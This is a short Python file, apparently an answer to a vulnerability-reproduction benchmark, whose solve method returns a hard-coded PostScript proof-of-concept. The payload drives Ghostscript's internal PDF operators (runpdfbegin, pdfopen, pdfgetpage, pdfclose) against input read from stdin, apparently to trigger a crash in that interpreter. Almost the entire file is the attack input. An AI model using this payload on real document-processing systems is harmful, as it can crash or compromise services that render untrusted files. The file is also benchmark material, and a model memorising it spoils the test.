import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            b"%!\n"
            b"10 dict begin\n"
            b"/T{\n"
            b" /f exch def\n"
            b" /runpdfbegin where{pop{f runpdfbegin}stopped pop}if\n"
            b" /.runpdfbegin where{pop{f .runpdfbegin}stopped pop}if\n"
            b" /pdfopen where{pop{f pdfopen}stopped pop}if\n"
            b" /.pdfopen where{pop{f .pdfopen}stopped pop}if\n"
            b" /pdfpagecount where{pop{pdfpagecount}stopped pop}if\n"
            b" /.pdfpagecount where{pop{.pdfpagecount}stopped pop}if\n"
            b" /pdfgetpage where{pop{1 pdfgetpage}stopped pop}if\n"
            b" /.pdfgetpage where{pop{1 .pdfgetpage}stopped pop}if\n"
            b" /pdfclose where{pop{pdfclose}stopped pop}if\n"
            b" /.pdfclose where{pop{.pdfclose}stopped pop}if\n"
            b" /runpdfend where{pop{runpdfend}stopped pop}if\n"
            b" /.runpdfend where{pop{.runpdfend}stopped pop}if\n"
            b" clear\n"
            b"}def\n"
            b"{(%stdin)(r)file/ASCII85Decode filter}stopped{pop}{T}ifelse\n"
            b"{(%stdin)(r)file}stopped{pop}{T}ifelse\n"
            b"end\n"
            b"quit\n"
        )
        return poc